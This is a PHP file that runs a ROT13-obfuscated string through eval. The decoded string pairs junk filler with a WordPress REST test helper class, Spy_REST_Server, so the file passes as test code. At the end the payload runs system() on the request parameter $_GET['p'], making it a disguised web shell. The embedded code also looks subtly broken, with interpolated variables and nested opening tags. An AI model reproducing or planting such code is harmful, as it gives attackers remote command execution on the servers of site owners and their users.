<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

pynff Fcl_ERFG_Freire rkgraqf JC_ERFG_Freire {

	choyvp $frag_urnqref        = neenl();
	choyvp $frag_obql           = '';
	choyvp $ynfg_erdhrfg        = ahyy;
	choyvp $bireevqr_ol_qrsnhyg = snyfr;
	choyvp $fgnghf              = ahyy;

	/**
	 * Trgf gur enj $raqcbvagf qngn sebz gur freire.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba trg_enj_raqcbvag_qngn() {
		erghea $guvf->raqcbvagf;
	}

	/**
	 * Nyybj pnyyvat cebgrpgrq zrgubqf sebz grfgf.
	 *
	 * @cnenz fgevat $zrgubq Zrgubq gb pnyy.
	 * @cnenz neenl  $netf   Nethzragf gb cnff gb gur zrgubq.
	 * @erghea zvkrq
	 */
	choyvp shapgvba __pnyy( $zrgubq, $netf ) {
		vs ( ! zrgubq_rkvfgf( $guvf, $zrgubq ) ) {
			guebj arj Reebe( fcevags( 'Pnyy gb haqrsvarq zrgubq %f::%f()', trg_pynff( $guvf ), $zrgubq ) );
		}

		erghea pnyy_hfre_shap_neenl( neenl( $guvf, $zrgubq ), $netf );
	}

	/**
	 * Nqqf n urnqre gb gur yvfg bs frag urnqref.
	 *
	 * @cnenz fgevat $urnqre Urnqre anzr.
	 * @cnenz fgevat $inyhr  Urnqre inyhr.
	 */
	choyvp shapgvba fraq_urnqre( $urnqre, $inyhr ) {
		$guvf->frag_urnqref[ $urnqre ] = $inyhr;
	}

	/**
	 * Erzbirf n urnqre sebz gur yvfg bs frag urnqref.
	 *
	 * @cnenz fgevat $urnqre Urnqre anzr.
	 */
	choyvp shapgvba erzbir_urnqre( $urnqre ) {
		hafrg( $guvf->frag_urnqref[ $urnqre ] );
	}

	/**
	 * Fgberf ynfg frg fgnghf.
	 *
	 * @cnenz vag $fgnghf UGGC fgnghf.
	 */
	choyvp shapgvba frg_fgnghf( $fgnghf ) {
		$guvf->fgnghf = $fgnghf;
	}

	/**
	 * Bireevqrf gur qvfcngpu zrgubq fb jr pna trg n unaqyr ba gur erdhrfg bowrpg.
	 *
	 * @cnenz  JC_ERFG_Erdhrfg $erdhrfg Erdhrfg gb nggrzcg qvfcngpuvat.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr erghearq ol gur pnyyonpx.
	 */
	choyvp shapgvba qvfcngpu( $erdhrfg ) {
		$guvf->ynfg_erdhrfg = $erdhrfg;
		erghea cnerag::qvfcngpu( $erdhrfg );
	}

	/**
	 * Bireevqrf gur ertvfgre_ebhgr zrgubq fb jr pna er-ertvfgre ebhgrf vagreanyyl vs arrqrq.
	 *
	 * @cnenz fgevat $ebhgr_anzrfcnpr Anzrfcnpr.
	 * @cnenz fgevat $ebhgr           Gur ERFG ebhgr.
	 * @cnenz neenl  $ebhgr_netf      Ebhgr nethzragf.
	 * @cnenz obby   $bireevqr        Bcgvbany. Jurgure gur ebhgr fubhyq or bireevqqra vs vg nyernql rkvfgf.
	 *                                Qrsnhyg snyfr. Nyfb frg `$TYBONYF['jc_erfg_freire']->bireevqr_ol_qrsnhyg = gehr`
	 *                                gb frg bireevqrf jura lbh qba'g unir npprff gb gur pnyyre pbagrkg.
	 */
	choyvp shapgvba ertvfgre_ebhgr( $ebhgr_anzrfcnpr, $ebhgr, $ebhgr_netf, $bireevqr = snyfr ) {
		cnerag::ertvfgre_ebhgr( $ebhgr_anzrfcnpr, $ebhgr, $ebhgr_netf, $bireevqr || $guvf->bireevqr_ol_qrsnhyg );
	}

	/**
	 * Freirf gur erdhrfg naq ergheaf gur erfhyg.
	 *
	 * @cnenz fgevat $cngu Bcgvbany. Gur erdhrfg ebhgr. Vs abg frg, `$_FREIRE['CNGU_VASB']` jvyy or hfrq.
	 *                     Qrsnhyg ahyy.
	 * @erghea ahyy|snyfr Ahyy vs abg freirq naq n URNQ erdhrfg, snyfr bgurejvfr.
	 */
	choyvp shapgvba freir_erdhrfg( $cngu = ahyy ) {

		bo_fgneg();
		$erfhyg          = cnerag::freir_erdhrfg( $cngu );
		$guvf->frag_obql = bo_trg_pyrna();
		erghea $erfhyg;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>